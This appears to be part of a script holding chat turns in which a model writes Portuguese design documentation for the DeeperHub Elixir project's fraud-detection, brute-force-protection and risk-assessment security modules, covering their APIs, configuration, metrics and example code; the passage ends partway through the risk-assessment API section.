## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Integrar modelos de Machine Learning para detecção de anomalias mais sofisticada e adaptativa.
*   [ ] Desenvolver uma interface de usuário para analistas de fraude gerenciarem regras, revisarem detecções e verem estatísticas.
*   [ ] Adicionar suporte para \"listas de observação\" (watchlists) de usuários ou entidades com comportamento suspeito.
*   [ ] Implementar feedback loop para que as decisões dos analistas (ex: marcar como falso positivo) possam retroalimentar e ajustar os modelos/regras.
*   [ ] Permitir simulação de novas regras contra dados históricos antes de ativá-las em produção.
*   [ ] Integração com provedores externos de dados de risco/fraude (ex: reputação de IP, dados de cartão de crédito roubado).

---

*Última atualização: 2025-05-11*

---

Este módulo de Detecção de Fraude é bastante abrangente e interage com muitos outros.

Onde gostaria de focar agora? Talvez `DeeperHub.Security.BruteForceProtection` ou `DeeperHub.Security.RiskAssessment`? Ou podemos ir para um módulo Core como `DeeperHub.Core.Repo`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos seguir com outro componente importante da camada de segurança: `DeeperHub.Security.BruteForceProtection`.

---

# Módulo: `DeeperHub.Security.BruteForceProtection` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.BruteForceProtection`

O módulo `DeeperHub.Security.BruteForceProtection` é responsável por detectar e mitigar ataques de força bruta contra o sistema DeeperHub. Ataques de força bruta ocorrem quando um invasor tenta adivinhar credenciais (como senhas) ou outros segredos através de um grande volume de tentativas.

Este módulo monitora tentativas falhas de acesso para identificadores específicos (como endereços IP, nomes de usuário ou emails), aplicando contramedidas como bloqueios temporários ou a exigência de desafios CAPTCHA para dificultar esses ataques e proteger as contas dos usuários. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Monitoramento de Tentativas Falhas:**
    *   Registrar tentativas de login falhas para diferentes identificadores (`record_failed_attempt/2`).
    *   Registrar tentativas de outras operações sensíveis que podem ser alvo de força bruta (ex: verificação de token de reset de senha).
*   **Aplicação de Contramedidas:**
    *   **Bloqueio Temporário:** Bloquear um identificador (IP, usuário) por um período configurável após um número excessivo de tentativas falhas (`is_blocked?/1`).
    *   **Requisição de CAPTCHA:** Exigir que o usuário resolva um CAPTCHA após um certo número de tentativas falhas, antes de permitir novas tentativas (`captcha_required?/1`).
*   **Gerenciamento de Estado de Tentativas:**
    *   Manter contadores de tentativas falhas por identificador e por tipo de operação.
    *   Resetar contadores após uma tentativa bem-sucedida (`record_successful_attempt/1`) ou após um período de inatividade.
*   **Configurabilidade de Políticas:**
    *   Permitir a configuração de limiares para bloqueio e CAPTCHA (número de tentativas, janela de tempo).
    *   Permitir a configuração da duração dos bloqueios.
*   **Limpeza de Dados Antigos:**
    *   Remover periodicamente registros de tentativas antigas e bloqueios expirados para manter a eficiência do sistema (via `CleanupWorker`).
*   **Observabilidade:**
    *   Fornecer estatísticas sobre tentativas bloqueadas, CAPTCHAs exigidos e identificadores monitorados (`get_statistics/0`).
    *   Registrar logs e métricas para atividades de força bruta.
*   **Integração:**
    *   Integrar-se com módulos de autenticação (`DeeperHub.Auth`) e recuperação de conta (`DeeperHub.Recovery`) para registrar tentativas.
    *   Integrar-se com um serviço de CAPTCHA (se aplicável, pode ser um serviço externo ou um módulo interno simples).

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.BruteForceProtection` (Fachada Pública):**
    *   Ponto de entrada para registrar tentativas e verificar o status de proteção.
    *   Delega chamadas para o `BruteForceProtectionService`.
2.  **`DeeperHub.Security.BruteForceProtection.Services.BruteForceProtectionService` (GenServer):**
    *   **Responsabilidade:** O coração do sistema, gerenciando o estado das tentativas e bloqueios.
    *   **Estado Interno (geralmente em ETS para performance):**
        *   Tabela de contadores de tentativas falhas (ex: `{identifier, operation_type} -> {count, last_attempt_timestamp}`).
        *   Tabela de identificadores bloqueados (ex: `{identifier} -> {blocked_until_timestamp, reason}`).
        *   Tabela de identificadores que requerem CAPTCHA (ex: `{identifier} -> captcha_required_until_timestamp`).
    *   **Interações:** Recebe chamadas da fachada, aplica lógicas de incremento de contador, bloqueio, verificação de CAPTCHA. Dispara a limpeza periódica.
3.  **`DeeperHub.Security.BruteForceProtection.Workers.CleanupWorker` (GenServer):**
    *   **Responsabilidade:** Executar periodicamente a limpeza de dados de tentativas antigas e bloqueios expirados nas tabelas ETS (ou outro storage).
4.  **Configurações (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Limiares de tentativas.
    *   Janelas de tempo para contagem.
    *   Duração de bloqueios.
    *   Configurações de CAPTCHA.
5.  **`DeeperHub.Security.BruteForceProtection.Telemetry` (ou `MetricsReporter`):**
    *   Para registrar métricas sobre a atividade de proteção.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/brute_force_protection/
├── brute_force_protection.ex             # Fachada Pública
│
├── services/
│   └── brute_force_protection_service.ex # GenServer principal
│
├── workers/
│   └── cleanup_worker.ex                 # Worker para limpeza
│
├── supervisor.ex
└── telemetry.ex                          # (ou MetricsReporter.ex)
```
*(Os módulos `BruteForceProtectionAdapter` e `BruteForceProtectionBehaviour` da documentação original podem ser consolidados se houver apenas uma implementação principal, como o `BruteForceProtectionService` GenServer.)*

### 3.3. Decisões de Design Importantes

*   **Armazenamento em Memória (ETS) para Performance:** Contadores de tentativas e bloqueios de curto prazo são frequentemente armazenados em ETS para acesso rápido e para evitar sobrecarga no banco de dados principal. Bloqueios mais longos ou persistentes podem envolver o DB.
*   **Identificadores Flexíveis:** O sistema deve ser capaz de rastrear tentativas por diferentes tipos de identificadores (IP, username, email, ID de sessão, etc.), dependendo do contexto da operação.
*   **Escalabilidade do CAPTCHA:** Se CAPTCHAs forem usados, a integração deve ser com um serviço de CAPTCHA robusto ou um mecanismo que não seja facilmente contornável.
*   **Políticas Granulares:** Idealmente, as políticas de proteção (limiares, durações) podem ser configuradas por tipo de operação (ex: login vs. reset de senha).

## 🛠️ 4. Casos de Uso Principais

*   **Múltiplas Tentativas de Login Falhas por um IP:**
    *   `DeeperHub.Auth` registra cada tentativa falha via `BruteForceProtection.record_failed_attempt(\"ip:1.2.3.4\", %{operation: :login})`.
    *   Após `N` falhas, `BruteForceProtectionService` marca o IP como requerendo CAPTCHA.
    *   Após `M` falhas (com ou sem CAPTCHA), o IP é temporariamente bloqueado.
    *   Requisições subsequentes desse IP para o endpoint de login são rejeitadas com 429 ou 403.
*   **Tentativas de Adivinhar Código de Reset de Senha:**
    *   `DeeperHub.Recovery` registra cada tentativa falha de verificação de token de reset para um `user_id` ou `token_id`.
    *   Após algumas falhas, o `user_id` pode ser temporariamente impedido de tentar mais verificações de token.
*   **Usuário Legítimo Esquece Senha e Excede Tentativas:**
    *   O usuário é informado sobre o bloqueio temporário e/ou a necessidade de CAPTCHA.
    *   Após o período de bloqueio, ou resolvendo o CAPTCHA, o usuário pode tentar novamente.
    *   Um login bem-sucedido reseta os contadores de falha para aquele identificador/operação.

## 🌊 5. Fluxos Importantes

### Fluxo de Registro de Tentativa Falha e Bloqueio

1.  **Operação Falha:** Um módulo (ex: `AuthService`) detecta uma tentativa falha de uma operação sensível (ex: login).
2.  **Registro:** O módulo chama `DeeperHub.Security.BruteForceProtection.record_failed_attempt(identifier, %{operation_type: :login, username_attempted: \"foo\"})`.
    *   `identifier` pode ser `ip:<ip_address>`, `user:<user_id>`, `email:<email_address>`.
3.  **`BruteForceProtectionService` (GenServer):**
    *   Recebe o registro.
    *   Incrementa o contador de falhas para o `identifier` e `operation_type` em sua tabela ETS.
    *   Verifica se o número de falhas dentro da janela de tempo configurada excede o limiar para CAPTCHA.
        *   Se sim, marca o `identifier` como `captcha_required` com um timestamp de expiração.
    *   Verifica se o número de falhas excede o limiar para bloqueio.
        *   Se sim, adiciona o `identifier` à lista de bloqueados com um timestamp de `blocked_until`. Loga o bloqueio e emite um evento/métrica.
4.  **Resposta:** Retorna `:ok` para o chamador.

### Fluxo de Verificação de Tentativa (`check_attempt/2`)

1.  **Antes da Operação:** Um módulo (ex: Plug de Autenticação) chama `DeeperHub.Security.BruteForceProtection.check_attempt(identifier, %{operation_type: :login})` antes de processar uma operação.
2.  **`BruteForceProtectionService` (GenServer):**
    *   Verifica se o `identifier` está na lista de bloqueados.
        *   Se sim, e o bloqueio ainda está ativo, retorna `{:ok, :blocked}`.
    *   Verifica se o `identifier` está marcado como `captcha_required`.
        *   Se sim, e ainda ativo, retorna `{:ok, :captcha_required}`.
    *   Caso contrário, retorna `{:ok, :allowed}`.

## 📡 6. API (Funções Públicas da Fachada)

*(A documentação original já tem uma boa base para estas funções. Vamos refinar e adicionar.)*

### 6.1. `DeeperHub.Security.BruteForceProtection.record_failed_attempt(identifier :: String.t(), context :: map()) :: :ok | {:error, term()}`

*   **Descrição:** Registra uma tentativa falha para um identificador. Incrementa contadores e aplica políticas de CAPTCHA/bloqueio.
*   **`identifier`:** String que identifica a origem da tentativa (ex: `\"ip:1.2.3.4\"`, `\"user_id:abc\"`, `\"email:user@example.com\"`).
*   **`context`:** Mapa com informações adicionais.
    *   `:operation_type` (atom, obrigatório): Tipo da operação que falhou (ex: `:login`, `:password_reset_verify`, `:mfa_verify`).
    *   Outros dados relevantes (ex: `:username_attempted`).
*   **Retorno:** `:ok`. Lança exceção em caso de erro interno grave.

### 6.2. `DeeperHub.Security.BruteForceProtection.record_successful_attempt(identifier :: String.t(), context :: map()) :: :ok`

*   **Descrição:** Registra uma tentativa bem-sucedida, o que geralmente reseta os contadores de falha para o `identifier` e `operation_type` específicos.
*   **`identifier`:** Mesmo formato de `record_failed_attempt/2`.
*   **`context`:**
    *   `:operation_type` (atom, obrigatório): Tipo da operação bem-sucedida.

### 6.3. `DeeperHub.Security.BruteForceProtection.check_attempt(identifier :: String.t(), context :: map()) :: {:ok, :allowed | :captcha_required | :blocked} | {:error, term()}`

*   **Descrição:** Verifica o status de proteção para um identificador antes de permitir uma operação.
*   **Retorno:**
    *   `{:ok, :allowed}`: A tentativa é permitida.
    *   `{:ok, :captcha_required}`: Um CAPTCHA deve ser resolvido antes de prosseguir.
    *   `{:ok, :blocked}`: A tentativa está bloqueada temporariamente.
*   **Exemplo:**
    ```elixir
    case BruteForceProtection.check_attempt(\"ip:\" <> conn.remote_ip, %{operation_type: :login}) do
      {:ok, :allowed} -> # Prosseguir
      {:ok, :captcha_required} -> # Redirecionar para CAPTCHA
      {:ok, :blocked} -> # Retornar 429 Too Many Requests
      {:error, _} -> # Logar erro, talvez permitir com cautela
    end
    ```

### 6.4. `DeeperHub.Security.BruteForceProtection.is_blocked?(identifier :: String.t(), context :: map() | nil) :: boolean()`

*   **Descrição:** Retorna `true` se o identificador estiver atualmente bloqueado para o tipo de operação no contexto (se fornecido), `false` caso contrário.

### 6.5. `DeeperHub.Security.BruteForceProtection.captcha_required?(identifier :: String.t(), context :: map() | nil) :: boolean()`

*   **Descrição:** Retorna `true` se um CAPTCHA for necessário para o identificador e tipo de operação.

### 6.6. `DeeperHub.Security.BruteForceProtection.clear_attempts(identifier :: String.t(), context :: map() | nil) :: :ok`

*   **Descrição:** Limpa manualmente todos os contadores de falha e status de CAPTCHA/bloqueio para um identificador (e tipo de operação, se `context` fornecido). Usado por administradores ou após recuperação de conta bem-sucedida.

## ⚙️ 7. Configuração

Configurações gerenciadas pelo `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :brute_force, :enabled]`** (Boolean): Habilita/desabilita o módulo. (Padrão: `true`)
*   **`[:security, :brute_force, :policies]`** (List de Maps): Lista de políticas. Cada política define:
    *   `:operation_type` (Atom): A qual operação esta política se aplica (ex: `:login`, `:password_reset`, `:all_failed_auth`).
    *   `:identifier_types` (List de Atoms): Quais tipos de identificadores esta política rastreia (ex: `[:ip, :user_id]`).
    *   `:captcha_threshold` (Integer): Número de falhas para exigir CAPTCHA.
    *   `:captcha_window_seconds` (Integer): Janela de tempo para contar falhas para CAPTCHA.
    *   `:block_threshold` (Integer): Número de falhas para bloquear.
    *   `:block_window_seconds` (Integer): Janela de tempo para contar falhas para bloqueio.
    *   `:block_duration_seconds` (Integer): Duração do bloqueio.
    *   `:block_increment_factor` (Float, opcional): Fator para aumentar a duração do bloqueio em bloqueios subsequentes. (Padrão: `1.0`)
    *   `:max_block_duration_seconds` (Integer, opcional): Duração máxima de um bloqueio.
*   **`[:security, :brute_force, :cleanup_worker, :interval_minutes]`** (Integer): Intervalo para o `CleanupWorker`. (Padrão: `60`)
*   **`[:security, :brute_force, :cleanup_worker, :attempt_retention_days]`** (Integer): Por quantos dias manter registros de tentativas. (Padrão: `7`)
*   **`[:security, :captcha, :service_module]`** (Module, opcional): Módulo do serviço de CAPTCHA a ser usado (se aplicável).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter políticas e configurações.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para registrar métricas.
*   `DeeperHub.Core.EventBus` (opcional): Para publicar eventos de bloqueio ou atividade suspeita.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para uma interface mais rica sobre as políticas.
*   Um serviço de CAPTCHA (se integrado).

### 8.2. Bibliotecas Externas

*   Nenhuma dependência externa direta é estritamente necessária para a lógica central, que pode ser implementada com ETS.

## 🤝 9. Como Usar / Integração

**Integrando com o fluxo de login em `DeeperHub.Auth.Services.LoginService`:**
```elixir
def authenticate(email, password, context_info) do
  ip_identifier = \"ip:#{context_info.ip_address}\"
  email_identifier = \"email:#{email}\"

  # Verificar antes de tentar autenticar
  case BruteForceProtection.check_attempt(ip_identifier, %{operation_type: :login}) do
    {:ok, :blocked} -> {:error, :ip_blocked}
    {:ok, :captcha_required} -> {:error, :captcha_required_for_ip}
    {:ok, :allowed} ->
      # Tentar autenticar...
      case do_authenticate(email, password) do
        {:ok, user} ->
          BruteForceProtection.record_successful_attempt(ip_identifier, %{operation_type: :login})
          BruteForceProtection.record_successful_attempt(email_identifier, %{operation_type: :login})
          BruteForceProtection.record_successful_attempt(\"user_id:#{user.id}\", %{operation_type: :login})
          {:ok, user}
        {:error, :invalid_credentials} ->
          BruteForceProtection.record_failed_attempt(ip_identifier, %{operation_type: :login, email_attempted: email})
          BruteForceProtection.record_failed_attempt(email_identifier, %{operation_type: :login})
          # Se o usuário existir, também registrar falha para user_id
          # if user = Accounts.get_user_by_email(email), do: BruteForceProtection.record_failed_attempt(\"user_id:#{user.id}\", ...)
          {:error, :invalid_credentials}
      end
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar se os contadores de falha são incrementados corretamente.
*   Testar se o status `captcha_required` é definido após o limiar.
*   Testar se o status `blocked` é definido após o limiar e pela duração correta.
*   Testar se `record_successful_attempt` reseta os contadores.
*   Testar o `CleanupWorker` para remoção de entradas expiradas.
*   Localização: `test/deeper_hub/security/brute_force_protection/`.

### 10.2. Métricas

*   `deeper_hub.security.brute_force.failed_attempts.count` (tags: `identifier_type`, `operation_type`)
*   `deeper_hub.security.brute_force.captcha_required.count` (tags: `identifier_type`, `operation_type`)
*   `deeper_hub.security.brute_force.identifier_blocked.count` (tags: `identifier_type`, `operation_type`)
*   `deeper_hub.security.brute_force.active_blocks.gauge` (Gauge)
*   `deeper_hub.security.brute_force.cleanup.duration_ms` (Histograma)
*   `deeper_hub.security.brute_force.cleanup.items_removed.count` (Contador)

### 10.3. Logs

*   **Nível INFO:** Registro de tentativas bem-sucedidas que resetam contadores. Execução do `CleanupWorker`.
*   **Nível WARNING:** Identificador atinge limiar de CAPTCHA. Identificador é bloqueado.
*   **Nível ERROR:** Erros internos no `BruteForceProtectionService`.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :brute_force, :attempt_recorded]`
    *   Metadados: `%{identifier: id, operation_type: type, outcome: :success | :failure}`
*   `[:deeper_hub, :security, :brute_force, :status_changed]`
    *   Metadados: `%{identifier: id, operation_type: type, old_status: atom(), new_status: atom(), reason: reason, duration_seconds: dur}` (para :blocked ou :captcha_required)
*   `[:deeper_hub, :security, :brute_force, :cleanup_run]`
    *   Medições: `%{duration: native_time, items_removed: count}`

## ❌ 11. Tratamento de Erros

*   O serviço deve ser resiliente. Falhas internas no `BruteForceProtectionService` não devem impedir o fluxo principal da aplicação (ex: um login legítimo não deve falhar se o serviço de brute force estiver com problemas, mas um log de erro crítico deve ser gerado).
*   A limpeza de dados deve ser robusta para não remover bloqueios ativos indevidamente.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Proteção do Storage:** Se ETS for usado, ele é limitado ao nó. Se um armazenamento distribuído for usado para os contadores/bloqueios, ele deve ser protegido.
*   **Falsos Positivos:** Políticas muito agressivas podem bloquear usuários legítimos, especialmente em cenários de IP compartilhado (NAT, VPNs). A configuração de `identifier_types` e a opção de whitelisting de IPs (gerenciado por `IpFirewallService`) são importantes.
*   **Evasão:** Invasores podem tentar rotacionar IPs. Rastrear por outros identificadores (`user_id`, `email`) em conjunto com o IP pode ser mais eficaz.
*   **Ataques de Negação de Serviço ao Módulo:** Um grande volume de tentativas falhas pode sobrecarregar o GenServer se não houver otimizações ou se o processamento de cada tentativa for muito custoso.

## 🧑‍💻 13. Contribuição

*   Ao integrar com novas operações sensíveis, certifique-se de chamar `record_failed_attempt` e `record_successful_attempt` apropriadamente.
*   Defina políticas claras e testadas para cada `operation_type`.
*   Considere o impacto na experiência do usuário ao definir limiares e durações de bloqueio.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar \"listas brancas\" (allowlists) para identificadores que nunca devem ser bloqueados por força bruta.
*   [ ] Suporte para bloqueios progressivos (duração aumenta a cada bloqueio subsequente).
*   [ ] Integração mais profunda com análise comportamental para detectar se as tentativas falhas são de um usuário legítimo ou de um bot.
*   [ ] Permitir que administradores visualizem e gerenciem bloqueios ativos e contadores através de uma interface.
*   [ ] Adicionar opção para \"desafios\" mais avançados que CAPTCHA para certos níveis de suspeita.
*   [ ] Considerar o uso de um backend de armazenamento mais persistente e distribuído (ex: Redis) para os contadores e bloqueios, especialmente em ambientes clusterizados.

---

*Última atualização: 2025-05-11*

---

Próximo! Que tal `DeeperHub.Security.RiskAssessment` para vermos como os riscos são calculados?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ótimo! Vamos detalhar o `DeeperHub.Security.RiskAssessment`. Este módulo é fundamental para uma abordagem de segurança adaptativa e baseada em contexto.

---

# Módulo: `DeeperHub.Security.RiskAssessment` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.RiskAssessment`

O módulo `DeeperHub.Security.RiskAssessment` é responsável por avaliar o nível de risco associado a diversas operações e contextos dentro do sistema DeeperHub. Ele analisa uma combinação de fatores, como informações do usuário, comportamento, dados do dispositivo, localização geográfica, e a natureza da operação sendo realizada, para calcular uma pontuação de risco.

Esta pontuação pode então ser usada por outros módulos (como `DeeperHub.Auth`, `DeeperHub.Security.FraudDetection`, ou módulos de domínio) para tomar decisões informadas, como permitir a operação, exigir verificação adicional (ex: MFA), limitar funcionalidades, ou bloquear a ação completamente. O objetivo é adaptar as medidas de segurança dinamicamente ao risco percebido de cada interação. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Avaliação de Risco Multifatorial:**
    *   Analisar o risco de tentativas de login (`assess_login_risk/3`).
    *   Avaliar o risco de alterações de perfil (`assess_profile_change_risk/3`).
    *   Analisar o risco de transações financeiras ou outras ações críticas (`assess_transaction_risk/3`).
    *   Avaliar o risco de requisições de API (`assess_api_request_risk/3`).
    *   Avaliar o risco de sessões de usuário (`assess_session_risk/3`).
    *   Avaliar o risco de ações genéricas (`assess_action_risk/4`).
*   **Cálculo de Pontuação de Risco:**
    *   Utilizar um `RiskCalculatorService` para combinar diversos fatores de risco e seus respectivos pesos para gerar uma pontuação numérica.
    *   Mapear a pontuação de risco para níveis de risco qualitativos (ex: :low, :medium, :high, :critical).
*   **Gerenciamento de Fatores de Risco:**
    *   Coletar e processar dados de diferentes fontes para calcular fatores de risco (ex: reputação do IP, dispositivo conhecido, localização anômala, comportamento suspeito).
    *   Suportar fatores de risco básicos e avançados (via `AdvancedRiskFactors`).
*   **Gerenciamento de Perfis de Risco de Usuário:**
    *   Manter um perfil de risco dinâmico para cada usuário, que pode ser atualizado com base em seu comportamento e histórico (`get_risk_profile/2`, `update_risk_profile/3`).
*   **Recomendação de Ações:**
    *   Sugerir ações apropriadas com base no nível de risco avaliado (ex: permitir, exigir MFA, bloquear) (via `RiskActionRecommender`).
*   **Configurabilidade de Políticas de Risco:**
    *   Permitir a configuração de pesos para fatores de risco, limiares para níveis de risco e regras para recomendação de ações (via `DeeperHub.Security.Policy.SecurityPolicyManager`).
*   **Calibração de Pesos (Opcional):**
    *   Suportar a calibração automática ou manual dos pesos dos fatores de risco com base em feedback e dados históricos (via `RiskWeightCalibrator`).
*   **Histórico e Relatórios:**
    *   Manter um histórico de avaliações de risco (`get_risk_assessment_history/3`).
    *   Gerar relatórios sobre tendências de risco e eficácia das políticas (`generate_risk_report/3`).
*   **Observabilidade:**
    *   Registrar métricas e logs detalhados sobre as avaliações de risco.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.RiskAssessment` (Fachada Pública):**
    *   Ponto de entrada para solicitar avaliações de risco.
    *   Delega para o `RiskAssessmentService`.
2.  **`DeeperHub.Security.RiskAssessment.Services.DefaultRiskAssessmentService` (GenServer ou Serviço Coordenador):**
    *   Orquestra o processo de avaliação de risco.
    *   Coleta dados de contexto e do perfil do usuário.
    *   Chama o `RiskFactorCalculator` e `AdvancedRiskFactors` para obter os fatores de risco.
    *   Chama o `RiskCalculatorService` para obter a pontuação e nível de risco.
    *   Chama o `RiskActionRecommender` para obter ações recomendadas.
    *   Persiste o resultado da avaliação (opcionalmente).
3.  **`DeeperHub.Security.RiskAssessment.Services.RiskFactorCalculator` (ou `RiskFactorsCalculator`):**
    *   Módulo funcional responsável por calcular fatores de risco individuais com base nos dados de entrada (ex: \"distância da última localização conhecida\", \"idade da conta\", \"reputação do IP\").
4.  **`DeeperHub.Security.RiskAssessment.Services.AdvancedRiskFactors` (GenServer ou Módulo Funcional):**
    *   Calcula fatores de risco mais complexos ou que dependem de análise comportamental ou de padrões (ex: \"velocidade de viagem impossível\", \"padrão de navegação anômalo\").
    *   Pode interagir com `DeeperHub.Security.BehavioralAnalysis`.
5.  **`DeeperHub.Security.RiskAssessment.Services.RiskCalculatorService` (ou `RiskCalculator`):**
    *   Recebe os fatores de risco e seus valores.
    *   Aplica os pesos configurados (obtidos do `SecurityPolicyManager`).
    *   Calcula a pontuação de risco final.
    *   Determina o nível de risco (low, medium, high, critical) com base em limiares.
6.  **`DeeperHub.Security.RiskAssessment.Services.RiskActionRecommender` (GenServer ou Módulo Funcional):**
    *   Com base no nível de risco, tipo de operação e políticas configuradas, recomenda ações de segurança (ex: `:allow`, `:challenge_mfa`, `:block`).
7.  **`DeeperHub.Security.RiskAssessment.Services.RiskWeightCalibrator` (GenServer, Opcional):**
    *   Gerencia e ajusta os pesos dos fatores de risco.
8.  **`DeeperHub.Security.RiskAssessment.Metrics.RiskMetricsCollector` (GenServer):**
    *   Coleta e armazena métricas relacionadas às avaliações de risco.
9.  **Schemas (se persistência for usada para perfis/histórico):**
    *   `DeeperHub.Security.RiskAssessment.Schema.RiskProfile`
    *   `DeeperHub.Security.RiskAssessment.Schema.RiskAssessmentLog`
10. **Configurações (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Pesos dos fatores de risco.
    *   Limiares para níveis de risco.
    *   Regras para recomendação de ações.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/risk_assessment/
├── risk_assessment.ex                # Fachada Pública
│
├── services/
│   ├── default_risk_assessment_service.ex # Serviço orquestrador
│   ├── risk_factor_calculator.ex     # Calcula fatores básicos
│   ├── advanced_risk_factors.ex      # Calcula fatores avançados
│   ├── risk_calculator_service.ex    # Calcula score e nível
│   ├── risk_action_recommender.ex    # Recomenda ações
│   └── risk_weight_calibrator.ex     # (Opcional) Calibra pesos
│
├── metrics/
│   └── risk_metrics_collector.ex     # Coleta métricas de risco
│
├── schemas/                          # Se houver persistência de perfis/logs
│   ├── risk_profile.ex
│   └── risk_assessment_log.ex
│
├── supervisor.ex
└── telemetry.ex
```
*(O `RiskAssessmentAdapter` da documentação original pode ser a própria fachada ou o `DefaultRiskAssessmentService` se ele implementar o behaviour.)*

### 3.3. Decisões de Design Importantes

*   **Abordagem Baseada em Fatores:** O risco é calculado pela combinação de múltiplos fatores, cada um com um peso configurável.
*   **Granularidade:** Diferentes tipos de operações podem ter diferentes conjuntos de fatores de risco e pesos.
*   **Adaptabilidade:** O sistema deve ser capaz de aprender e adaptar os pesos dos fatores de risco ao longo do tempo (via `RiskWeightCalibrator` ou feedback manual).
*   **Transparência (Opcional):** Capacidade de explicar por que uma determinada pontuação de risco foi atribuída (listando os fatores contribuintes).

## 🛠️ 4. Casos de Uso Principais

*   **Login de Alto Risco:**
    *   Um usuário tenta logar de um país e dispositivo nunca antes vistos, fora do horário habitual.
    *   `RiskAssessment` calcula um score alto.
    *   `RiskActionRecommender` sugere `:require_mfa` e `:notify_user_unusual_login`.
    *   `DeeperHub.Auth` força o fluxo de MFA.
*   **Alteração de Email de Baixo Risco:**
    *   Usuário logado de um dispositivo confiável e localização comum altera seu email.
    *   `RiskAssessment` calcula um score baixo.
    *   `RiskActionRecommender` sugere `:allow` e `:notify_user_email_changed_confirm`.
    *   `DeeperHub.Accounts` permite a alteração e envia um email de notificação.
*   **Transferência Financeira Crítica:**
    *   Usuário tenta realizar uma transferência de valor muito alto para um novo destinatário.
    *   `RiskAssessment` calcula um score crítico.
    *   `RiskActionRecommender` sugere `:block_temporarily_and_require_manual_review`.
    *   O módulo de transações bloqueia a operação e a encaminha para revisão.

## 🌊 5. Fluxos Importantes

### Fluxo de Avaliação de Risco para uma Tentativa de Login

1.  **`DeeperHub.Auth` (ou `SecurityManager`):** Chama `RiskAssessment.assess_login_risk(user_id, context_info, opts)`.
2.  **`DefaultRiskAssessmentService`:**
    *   Obtém o perfil de risco do usuário (`get_risk_profile`).
    *   Chama `RiskFactorCalculator.calculate_login_risk_factors(user_id, context_info, profile)` para obter fatores como:
        *   Reputação do IP.
        *   Dispositivo conhecido/novo.
        *   Localização conhecida/nova.
        *   Distância/velocidade desde o último login.
        *   Histórico de tentativas falhas recentes.
    *   Chama `AdvancedRiskFactors.evaluate_advanced_factors(context_info, user_id, :login)` para obter fatores como:
        *   Análise de padrão de comportamento de login (horário, frequência).
    *   Agrega todos os fatores de risco.
3.  **`RiskCalculatorService`:**
    *   Recebe a lista de fatores e seus valores.
    *   Obtém os pesos dos fatores e os limiares de nível de risco do `SecurityPolicyManager`.
    *   Calcula a pontuação de risco final.
    *   Determina o nível de risco (ex: `:high`).
4.  **`RiskActionRecommender`:**
    *   Recebe o nível de risco `:high` e o tipo de operação `:login`.
    *   Consulta as políticas para determinar as ações recomendadas (ex: `[:require_mfa, :notify_user]`).
5.  **`DefaultRiskAssessmentService`:**
    *   (Opcional) Persiste o log da avaliação.
    *   Retorna `{:ok, %{risk_score: 78.5, risk_level: :high, recommended_actions: [:require_mfa, :notify_user], factors: [...]}}` para o chamador.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Security.RiskAssessment`)

### 6.1. `DeeperHub.Security.RiskAssessment.assess_risk(user_id :: String.t() | nil, operation_type :: atom(), operation_data :: map(), context_data :: map()) :: {:ok, RiskAssessmentResult.t()} | {:error, term()}`

*   **Descrição:** Função genérica para avaliar o risco de qualquer operação.
*   **`operation_type`:** Um átomo identificando a operação (ex: `:login`, `:profile_email_change`, `:fund_transfer`, `:api_sensitive_read`).
*   **`operation_data`:** Dados específicos da operação (ex: para `:fund_transfer`, `%{amount: 1000, recipient_id: \"xyz\"}`).
*   **`context_data`:** Informações contextuais (IP, dispositivo, sessão, etc.).
*   **`RiskAssessmentResult.t()`:** `%{risk_score: float(), risk_level: atom(), recommended_actions: list(atom()), contributing_factors: list(map()), assessment_id: String.t()}`.
*   **Exemplo:**
    ```elixir
    op_data = %{new_email: \"new@example.com\"}
    context = %{ip_address: \"1.2.3.4\", device_id: \"dev_abc\"}
    RiskAssessment.assess_risk(\"user1\", :profile_email_change, op_data, context)
    ```

### 6.2. Funções Específicas (atalhos para `assess_risk/4`):

*   `assess_login_risk(user_id, context_data, opts \\\\ [])`
*   `assess_profile_change_risk(user_id, changes_map, context_data, opts \\\\ [])`
*   `assess_transaction_risk(user_id, transaction_details, context_data, opts \\\\ [])`
*   `assess_api_request_risk(client_id_or_api_key, request_details, context_data, opts \\\\ [])`
*   `assess_session_risk(session_id, context_data, opts \\\\ [])`
*   `assess_action_risk(user_id, action_atom, action_params, context_data, opts \\\\ [])`

### 6.3. `DeeperHub.Security.RiskAssessment.get_risk_profile(user_id :: String.t(), opts :: keyword()) :: {:ok, UserRiskProfile.t()} | {:error, :not_found | term()}`

*   **Descrição:** Obtém o perfil de risco consolidado para um usuário.
*   **`UserRiskProfile.t()`:** Um mapa com scores de risco médios históricos, padrões comportamentais, etc.

### 6.4. `DeeperHub.Security.RiskAssessment.update_risk_profile(user_id :: String.t(), assessment_result :: RiskAssessmentResult.t(), opts :: keyword()) :: :ok | {:error, term()}`

